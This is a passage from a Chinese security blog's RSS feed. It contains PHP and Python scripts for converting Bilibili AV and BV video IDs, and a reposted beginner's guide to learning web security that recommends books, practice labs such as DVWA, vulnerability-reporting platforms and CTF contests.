    </author><guid>https://www.bysec.cn/20210301/</guid>
    <description><![CDATA[<h1 id="av号bv号互相转换脚本">AV号BV号互相转换脚本</h1>
<h2 id="php实例">PHP实例</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-PHP" data-lang="PHP"><span class="k">class</span> <span class="nc">Bilibili</span>
<span class="p">{</span>
    <span class="k">protected</span> <span class="nv">$tr</span> <span class="o">=</span> <span class="s2">&#34;fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF&#34;</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$xor</span> <span class="o">=</span> <span class="mi">177451812</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$add</span> <span class="o">=</span> <span class="mi">8728348608</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$s</span> <span class="o">=</span> <span class="p">[</span><span class="mi">11</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">6</span><span class="p">];</span>

    <span class="c1">// BV 转 AV
</span><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="nf">dec</span><span class="p">(</span><span class="nv">$bv</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$r</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$tr</span> <span class="o">=</span> <span class="nx">array_flip</span><span class="p">(</span><span class="nx">str_split</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">tr</span><span class="p">));</span>
        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$r</span> <span class="o">+=</span> <span class="nv">$tr</span><span class="p">[</span><span class="nv">$bv</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">s</span><span class="p">[</span><span class="nv">$i</span><span class="p">]]]</span> <span class="o">*</span> <span class="p">(</span><span class="nx">pow</span><span class="p">(</span><span class="mi">58</span><span class="p">,</span> <span class="nv">$i</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="p">(</span><span class="nv">$r</span> <span class="o">-</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">add</span><span class="p">)</span> <span class="o">^</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">xor</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// AV 转 BV
</span><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="nf">enc</span><span class="p">(</span><span class="nv">$av</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$tr</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">tr</span><span class="p">);</span>
        <span class="nv">$bv</span> <span class="o">=</span> <span class="s1">&#39;BV1  4 1 7  &#39;</span><span class="p">;</span>
        <span class="nv">$av</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$av</span> <span class="o">^</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">xor</span><span class="p">)</span> <span class="o">+</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">add</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$bv</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">s</span><span class="p">[</span><span class="nv">$i</span><span class="p">]]</span> <span class="o">=</span> <span class="nv">$tr</span><span class="p">[</span><span class="nx">floor</span><span class="p">(</span><span class="nv">$av</span><span class="o">/</span><span class="nx">pow</span><span class="p">(</span><span class="mi">58</span><span class="p">,</span><span class="nv">$i</span><span class="p">)</span><span class="o">%</span><span class="mi">58</span><span class="p">)];</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$bv</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// 调用
</span><span class="c1"></span><span class="nv">$str</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Bilibili</span><span class="p">();</span>
<span class="k">echo</span> <span class="nv">$str</span><span class="o">-&gt;</span><span class="na">dec</span><span class="p">(</span><span class="s1">&#39;BV17x411w7KC&#39;</span><span class="p">);</span> <span class="c1">// 输出: 170001
</span><span class="c1"></span><span class="k">echo</span> <span class="nv">$str</span><span class="o">-&gt;</span><span class="na">enc</span><span class="p">(</span><span class="mi">170001</span><span class="p">);</span>  <span class="c1">// 输出: BV17x411w7KC
</span></code></pre></td></tr></table>
</div>
</div><h2 id="python实例">python实例</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">table</span><span class="o">=</span><span class="s1">&#39;fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF&#39;</span>
<span class="n">tr</span><span class="o">=</span><span class="p">{}</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">58</span><span class="p">):</span>
	<span class="n">tr</span><span class="p">[</span><span class="n">table</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="o">=</span><span class="n">i</span>
<span class="n">s</span><span class="o">=</span><span class="p">[</span><span class="mi">11</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">6</span><span class="p">]</span>
<span class="n">xor</span><span class="o">=</span><span class="mi">177451812</span>
<span class="n">add</span><span class="o">=</span><span class="mi">8728348608</span>

<span class="k">def</span> <span class="nf">dec</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
	<span class="n">r</span><span class="o">=</span><span class="mi">0</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
		<span class="n">r</span><span class="o">+=</span><span class="n">tr</span><span class="p">[</span><span class="n">x</span><span class="p">[</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]]]</span><span class="o">*</span><span class="mi">58</span><span class="o">**</span><span class="n">i</span>
	<span class="k">return</span> <span class="p">(</span><span class="n">r</span><span class="o">-</span><span class="n">add</span><span class="p">)</span><span class="o">^</span><span class="n">xor</span>

<span class="k">def</span> <span class="nf">enc</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
	<span class="n">x</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="n">xor</span><span class="p">)</span><span class="o">+</span><span class="n">add</span>
	<span class="n">r</span><span class="o">=</span><span class="nb">list</span><span class="p">(</span><span class="s1">&#39;BV1  4 1 7  &#39;</span><span class="p">)</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
		<span class="n">r</span><span class="p">[</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="o">=</span><span class="n">table</span><span class="p">[</span><span class="n">x</span><span class="o">//</span><span class="mi">58</span><span class="o">**</span><span class="n">i</span><span class="o">%</span><span class="mi">58</span><span class="p">]</span>
	<span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="n">dec</span><span class="p">(</span><span class="s1">&#39;BV17x411w7KC&#39;</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="n">dec</span><span class="p">(</span><span class="s1">&#39;BV1Q541167Qg&#39;</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="n">dec</span><span class="p">(</span><span class="s1">&#39;BV1mK4y1C7Bz&#39;</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="n">enc</span><span class="p">(</span><span class="mi">170001</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="n">enc</span><span class="p">(</span><span class="mi">455017605</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="n">enc</span><span class="p">(</span><span class="mi">882584971</span><span class="p">))</span>
</code></pre></td></tr></table>
</div>
</div>]]></description>
</item><item>
    <title>给表弟的Web安全入门建议</title>
    <link>https://www.bysec.cn/20210201/</link>
    <pubDate>Mon, 01 Feb 2021 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20210201/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://sosly.me/index.php/2017/07/17/studywebsec/" target="_blank" rel="noopener noreffer">https://sosly.me/index.php/2017/07/17/studywebsec/</a></em></p>
</blockquote>
<p>表弟大一刚结束，学的是计算机相关的专业，上学期开始学安全相关的技术，我就给他买了一套云课堂的 <a href="https://mooc.study.163.com/smartSpec/detail/1001227001.htm?share=1&amp;shareId=9305777" target="_blank" rel="noopener noreffer">《Web安全工程师微专业》</a> 课程，结果这货学到第一课的时候，因为错过章节考试时间直接没及格&hellip;&hellip;好在后边几课都按部就班的学习了，然后应该是6月份开始试着在 <a href="https://src.edu-info.edu.cn/" target="_blank" rel="noopener noreffer">教育行业SRC</a> 挖掘漏洞，到现在也只是发现了几个XSS、敏感文件泄露之类的小漏洞，和他同期学习课程的一些同学已经挖了很多了排名很靠前，还有在企业SRC挖洞的，看看别人家的表弟&hellip;之前表弟要准备课程的期末考试之类的，现在放暑假了，我就建议说可以再好好学习那套课程，趁着暑假，多实践。然后就讨论到 <strong>有没有适合入门阶段学习的Web安全书籍</strong> 这个问题。</p>
<p>说到Web安全书籍，这几年其实是一种百家齐放的状态，不断有优秀的书籍出版，那这里就<strong>尽可能少地整理几本我阅读过的Web安全入门书籍</strong>作为推荐。</p>
<p>如果没学过相关课程的小伙伴，真的从0基础开始的话，还是需要先掌握一些基本的技能：</p>
<ol>
<li>学习 <a href="http://www.w3school.com.cn/web/index.asp" target="_blank" rel="noopener noreffer">网站构建初级教程_W3C</a> 以及 <a href="http://www.runoob.com/http/http-tutorial.html" target="_blank" rel="noopener noreffer">HTTP协议基础-runoob</a> 上了解Web前后端以及HTTP协议的一些基础介绍，花半天时间对相关技术有个概念性的了解就够了。</li>
<li>Windows下下载 <a href="http://www.phpstudy.net/" target="_blank" rel="noopener noreffer">phpStudy</a> 或者 <a href="http://www.wampserver.com/" target="_blank" rel="noopener noreffer">WAMP</a> ，在本地搭建Web服务器环境，然后自己搜索两篇文章学习下基本的操作方法。这个本地Web服务器也就相当于学习过程中的一个实验环境了。</li>
<li>学习浏览器的开发者工具（通常快捷键F12调出），搜索一些教学文章，掌握Chrome或者Firefox浏览器开发者工具中的Network、Elements功能的常见用法，可以<strong>查看HTTP数据包以及定位页面元素</strong>。</li>
</ol>
<h1 id="0x01-给表弟的web安全入门建议">0x01 给表弟的Web安全入门建议</h1>
<h2 id="适合初学者的web安全书籍">适合初学者的Web安全书籍</h2>
<ol>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgJcGVMSBSJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQIXDlcTXBIdS0IJRmtqW1VPUUQGHGJsZR5uJhV%2Bc1U0R1pTDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcEl8WChMEXStcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVBxsFXRxcCltXWwg%3D" target="_blank" rel="noopener noreffer">《白帽子讲Web安全》</a>
道哥出品，很多人的Web安全启蒙书。</li>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgdcG1IXASJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQISDlUSWRYdS0IJRmt3BGRXFloyC2dLcVRsPBN4W1sHX1JlDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcHVMWABsFUCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVAhsHXBlYCltXWwg%3D" target="_blank" rel="noopener noreffer">《Web前端黑客技术揭秘》</a>
前端黑客技术，余弦的作品。</li>
</ol>
<p>对于读书，我觉得<strong>读书的目的是：学以致用</strong>。应该把<strong>注意力放在如何应用读到的知识，提高自己的技术，而不是学了多少内容。
一年哪怕只学习了一本书，也要让这本书的内容结结实实地提升自己的技能，而不是只为了多一点谈资或者阅读清单上多一个数目</strong>。这也是我这里只推荐了两本书的原因，因为我觉得这两本书，能够认真学习完，并且<strong>实践</strong>书中的案例和技能，已经很难得了，同时相比于简单翻一遍，要多花费很多的时间和精力。</p>
<h2 id="工具与实战">工具与实战</h2>
<p>那学习Web安全呢，同时还要掌握一些工具：<strong>浏览器开发者工具与浏览器插件（如HackBar、ProxySwitcher）、抓包工具如Burpsuite、漏洞扫描和验证工具如御剑、sqlmap、AWVS</strong>，工具可以在 <a href="http://www.freebuf.com/" target="_blank" rel="noopener noreffer">Freebuf</a>上自行搜索下载，教程可以参考<a href="https://www.ichunqiu.com/newRelease/darrPath/105" target="_blank" rel="noopener noreffer">Web安全-i春秋</a>系列教程中对应这几款工具的章节学习。</p>
<p>好的工具可以帮助我们提高测试效率，扩展测试思路。除了工具的使用，通过搭建本地实战环境练习手工技巧，也是很好的进阶之路，这里建议可以搭建 <a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener noreffer">DVWA</a>漏洞测试环境，然后参考 <a href="http://www.freebuf.com/?s=DVWA" target="_blank" rel="noopener noreffer">DVWA系列教程_Freebuf</a>进行学习。</p>
<p>学习的同时也可以在在<a href="https://src.edu-info.edu.cn/" target="_blank" rel="noopener noreffer">教育行业SRC</a>等漏洞平台上挖掘漏洞，赢得认可，也是一种动力，但挖掘漏洞的时候一定要注意规范和界限，可以参考<a href="https://sosly.me/index.php/2017/06/02/wangluoanquanfa/" target="_blank" rel="noopener noreffer">自律方能自由，《网络安全法》实施后的白帽子行为参考</a>，挖掘漏洞的同时也要注意保护自己。</p>
<h2 id="适合初学者的社区和资讯站点">适合初学者的社区和资讯站点</h2>
<ol>
<li>
<p><a href="https://bbs.ichunqiu.com/forum-59-1.html" target="_blank" rel="noopener noreffer">网站安全_i春秋社区</a>
i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门和进阶的文章都有，可以多多交流。</p>
</li>
<li>
<p><a href="http://www.freebuf.com/" target="_blank" rel="noopener noreffer">Freebuf</a>
很多科普和梳理性的文章，也经常会有时下的热点讨论。</p>
<h2 id="大学在校生可以关注的一些比赛">大学在校生可以关注的一些比赛</h2>
</li>
<li>
<p><a href="http://www.ciscn.cn/" target="_blank" rel="noopener noreffer">全国大学生信息安全竞赛</a>
这个和<strong>全国大学生电子设计竞赛信息安全技术专题邀请赛</strong>一样，都是做一个安全软硬件系统来解决一些安全问题，通常有项目文档提交、源代码提交、现场演示答辩等几个步骤，分为初赛复赛，<strong>全国大学生信息安全竞赛</strong>为每年一次，<strong>全国大学生电子设计竞赛信息安全技术专题邀请赛</strong>通常两年一次，这两个比赛获奖对于大学生都有竞赛加分，在锻炼自己的同时，对评奖学金和保研也有帮助。</p>
</li>
<li>
<p><a href="https://2017ncstisc.ichunqiu.com/" target="_blank" rel="noopener noreffer">全国大学生信息安全竞赛创新实践能力线上赛（CTF形式）</a>
这个是和i春秋合作的线上赛，和线下赛目前看来还没什么关联，CTF性质的。每年的CTF比赛很多，大家可以关注i春秋等一些站点的资讯就行了，大学生组队参加CTF比赛的挺多，也是很好的锻炼方式。</p>
</li>
</ol>
<h2 id="挖洞博客与团队">挖洞、博客与团队</h2>
<p>既然是入门了，建议就可以随着学习的深入，<strong>在一些SRC平台上挖掘漏洞，如果你不太喜欢走这个路线，也可以整理自己的学习过程，写一些技术博客进行分享</strong>，俗话说来“<strong>你挖洞来我拍砖</strong>”，都可以，而且一些平台如Freebuf、先知社区都有付费文章奖励计划，这两种都可以在学习技术的同时获取到一些物质上的奖励，如果你慢慢有了一些编程能力（Python、Web前后端等），除了让自己的安全技术自动化之外，还可以再Github等平台分享一些开源项目。相关的SRC站点我随后再说。
关于写博客，如果自己搭建站点的话，可以考虑<strong>使用hexo+github搭建免费个人博客</strong>，或者租用一台VPS部署Wordpress博客程序。其实我觉得，初学的话，可以不在站点搭建上浪费时间，在一些比较优质的博客平台上注册一个帐号即可，也可以有自己的个性域名。如<a href="https://www.oschina.net/blog" target="_blank" rel="noopener noreffer">oschina</a>、<a href="https://www.cnblogs.com/" target="_blank" rel="noopener noreffer">博客园</a>、<a href="http://www.jianshu.com/" target="_blank" rel="noopener noreffer">简书</a>。写博客本身就是对自己知识技能的巩固和梳理，不要怕写不好，博客就当是给自己看的。
有一个点要提示一下，既然想走安全这条路，那么给自己想一个个性的ID（昵称），提交漏洞或者注册博客时都用这个，好好维护，当做自己的个人品牌认真经营，随着你的贡献和分享越来越多，你的ID会被越来越多的人了解和认可。
积累的过程中，如果恰好遇到几个志同道合的小伙伴，那就组个小团队吧，平时技术切磋交流，或者组团挖洞，打CTF等都是极好的。也可以主动去搜寻，或者申请加入一些公开招新的安全团队。<strong>一个人有时候可以走的更快，但一个团队往往可以走的更远</strong>。</p>
<h2 id="一些进阶的书籍和资源推荐">一些进阶的书籍和资源推荐</h2>
<p>这部分内容按需选择即可，等你入门了之后，有了一定的技术和经验，你已经足够去规划自己的发展了。</p>
<ol>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgZRHF8RBSJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQITA1IfXxIdS0IJRmtHAWhBL1spfWBSABd9OGlSTmUGYT1TDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcHVMSABoEUStcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVAxYAUR9cCltXWwg%3D" target="_blank" rel="noopener noreffer">《HTTP权威指南》</a>
平时可以当做词典来翻阅。</li>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgZWGloWASJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQITBFQaWBYdS0IJRmtMCnt%2FI3pbUGJLAAx%2BIXJEYkEQEj5DDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcEloUAhoHVCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVAxEGVBhYCltXWwg%3D" target="_blank" rel="noopener noreffer">《黑客攻防技术宝典 Web实战篇》</a>
深入剖析Web安全技术。</li>
<li><a href="https://u.jd.com/XQQNOf" target="_blank" rel="noopener noreffer">《黑客秘笈 渗透测试实用指南》</a>
可以在虚拟机VMware中，下载运行kali Linux的VM版本进行学习和实践。</li>
</ol>
<p>编程技术相关的书籍和教程，<a href="http://www.w3school.com.cn/" target="_blank" rel="noopener noreffer">W3C</a>、<a href="http://www.runoob.com/" target="_blank" rel="noopener noreffer">菜鸟教程runoob</a> 和<a href="http://www.nowamagic.net/academy/" target="_blank" rel="noopener noreffer">现代魔法学院</a>已经能解决很多问题了，然后语言相关的官方文档都可以当做词典来查，如果想找本书系统学习的话，这里推荐下Python、PHP和Web前端的书。
<a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEg9XHFgXCyJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQIaBVIYWRwdS0IJRmttRmFzKRldUWdEVxQdD2hhYmAmS0FDDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwVQGVsRAxUPVytcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVChAAVhlSCltXWwg%3D" target="_blank" rel="noopener noreffer">《Python核心编程》</a>
<a href="https://u.jd.com/IOPdyM" target="_blank" rel="noopener noreffer">《PHP和MySQL Web开发》</a>
<a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgVXGF8UBSJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQIQBVYfWhIdS0IJRmtMe1NuJV8%2FUGFQQx1YX0xkaVwwWztlDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwVQGVgTAxABUCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVABAEURpcCltXWwg%3D" target="_blank" rel="noopener noreffer">《Head First HTML与CSS》</a>
<a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEw9RG1oXBCJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQMaA1UaWRMdS0IJRmtFAmQGJlMuVmIUdSVLPE19SVgqWTplDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwVQGVkUBxUPUCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsUChYHVBldCltXWwg%3D" target="_blank" rel="noopener noreffer">《JavaScript高级程序设计》</a></p>
<p>站点可以浏览下 <a href="http://www.anquanquan.info/" target="_blank" rel="noopener noreffer">安全圈info</a> 与 <a href="https://www.sec-wiki.com/" target="_blank" rel="noopener noreffer">SecWiki</a> ，前者是一个持续更新的安全圈站点导航，总能找到你想要的网站，之前说的SRC站点这里都有，后者是一个安全资讯的收录分享平台，有什么安全问题可以搜索一些历史文章看看。</p>
<h1 id="0x02-聊聊学习与实践">0x02 聊聊“学习”与“实践”</h1>
<h2 id="入门与进阶">入门与进阶</h2>
<p><strong>对于初学者来说，找一个靠谱的教程或者老师，帮助自己快速入门是非常有必要的。入门之后，虽然高手的点拨也很重要，但更多的功课其实是需要你自己来做的</strong>。这也是为什么优秀的入门教程很多，但是优质的进阶版本教程却不多。
有一句话叫“<strong>付费就是占便宜</strong>”，对于新手来说，入门阶段花一点钱买一套优质的课程，让有经验的内行带着自己学习，往往是最优的选择。还有一句话叫“免费的就是最贵的”，免费的教学资源，质量参差不齐难以保证，不用花钱，但耗费的是你筛选的精力和时间。自己根据条件取舍，现在已经逐渐进入了一种知识付费的时代，这就是我给表弟买了一套云课堂的<a href="https://mooc.study.163.com/smartSpec/detail/1001227001.htm?share=1&amp;shareId=9305777" target="_blank" rel="noopener noreffer">《Web安全工程师微专业》</a>课程作为入门学习的原因，一套优质的网课，相比于昂贵的线下班性价比很不错。</p>
<h2 id="等准备好了再实践">等准备好了再“实践”？</h2>
<p>李笑来老师有一个观点，学习任何一个学科的时候，都有一个概念很重要：</p>
<blockquote>
<p><strong>最少必要知识</strong>
<strong>MAKE</strong> : <strong>M</strong>inimal <strong>A</strong>ctionable <strong>K</strong>nowledge and <strong>E</strong>xperience</p>
</blockquote>
<p>就是说，当我们在学习某项技能的时候，就要用最快的时间摸索清楚<strong>最少必要知识 （MAKE）</strong> 都有哪些？ 然后迅速地掌握它们，这样就实现了“<strong>快速入门</strong>”，然后就可以开始<strong>动手实践</strong>，然后在实践中印证理论、加深理解，同时继续扩展学习。
<strong>同样的时间，一个用来等待，另一个用来践行，两者的差距可能是天壤之别。你要知道没有任何考试是在你准备充分了才开始的</strong>。
有些人喜欢等待，等到合适的时机出现的时候，再采取行动。另一些人则喜欢边做边想，有不足的地方就改进，有新的问题就解决。
一段时间过去之后，后者可能已经前进了很长一段路程，而前者多半还在等待一个“恰当的时机”。
<strong>我原来就有这个问题，老想着先体系化学完某门技术&hellip;结果就是坚持不实践，过了很久还是啥都不会，反而之前看的那些知识因为没实践过也都忘了</strong>。
<strong>用和学，用比学重要。用时比学时重要</strong>。“用时”是一个很好的概念。
很多人说自己“学”了那么多年英语，但现在依然说不出，听不懂。其实他们就是在用“学时”代替“用时”来计算自己的付出的。
我们总说有效学习，其实衡量有效学习最好的方式就是：计算使用的时间。在安全技术学习上，就是：<strong>实践的时间</strong>。</p>
<h2 id="从想到学到-到-做到">从“想到”、“学到” 到 “做到”</h2>
<p>“用”比“学”重要；“做”比“想”重要；边做边想，比单纯想想不知道好多少倍。只有做到了才是掌握了。“人至‘践’则无敌”。
只要你开始做，高估或低估的困难就不仅仅是一个估计，而是一个摆在面前需要解决的现实问题。你对于它的理解不会再飘忽不定，而会变得非常具体。
<strong>很多人在做得不好的时候，总是喜欢退缩回原来的舒适区，认为是由于自己的基础还不好所以才这么不顺利，而忘记了这些践行过程中的困难，才是真正帮他们打牢基础的过程</strong>。</p>
<h1 id="0x03-结语">0x03 结语</h1>
<p>很多人梦想找到一个牛逼的师父，几天速成然后笑傲江湖。可是每一个真正练就一身武艺的人都是靠冬练三九夏练三伏这么过来的，他们靠着一种忘我的热情持续投入进去磨练，数年如一日，最终自己也不知道怎么就发现具备了无坚不摧的实力。 同样，就算是要开好挖掘机，或着当一个好厨师，也要在自己的技能树上，一步一步地积累技能点，把过路点都点满了，才能点出大招。
我们从小到大往往会听到长辈们的建议：“戒骄戒躁”。虽然“戒骄”放在前面，但“戒骄”其实是有了一定成绩之后的事情。对大多数人来说，首先要“戒躁”，才有机会“戒骄”。</p>
<p>一个人能获得的最可贵的能力，都和掌握一门语言一样，你所付出的努力不是能够获得即时回馈的，甚至在很长的一段时间内没有任何收获，直到积累到了一定的阶段后，忽然爆发出惊人的力量，连你自己都不清楚这一切是如何发生的。比如锻炼身体，读书写作。当你经历了足够的量变终于引起质变时拥有的技能，大部分人是终身难以企及的，不是因为他们太笨，恰恰相反，因为他们都太聪明了。选择一个正确的方向，对那些无法立即获得回报的事情，依然能付出十年如一日的专注和热情，最终的结果也许不足以让你独孤求败，但足以出类拔萃。</p>
<p>祝表弟早日成为表哥，然后带带我~</p>
<h2 id="本文相关链接资源整理">本文相关链接资源整理：</h2>
<ol>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgJcGVMSBSJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQIXDlcTXBIdS0IJRmtqW1VPUUQGHGJsZR5uJhV%2Bc1U0R1pTDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcEl8WChMEXStcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVBxsFXRxcCltXWwg%3D" target="_blank" rel="noopener noreffer">《白帽子讲Web安全》</a></li>
